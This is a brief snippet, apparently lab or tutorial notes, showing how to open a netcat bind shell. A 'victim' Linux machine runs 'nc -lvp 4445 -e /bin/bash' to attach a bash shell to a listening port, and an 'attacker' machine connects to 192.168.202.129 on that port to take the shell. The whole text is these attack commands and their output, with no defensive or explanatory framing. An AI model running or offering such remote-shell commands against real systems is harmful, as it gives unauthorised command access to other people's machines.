# victim Linux machine 

root@kali:-# nc -lvp 4445 -e /bin/bash
listening on [any] 4445......

# Attacker linux machine 
root@kali:-# nc 192.168.202.129 4445

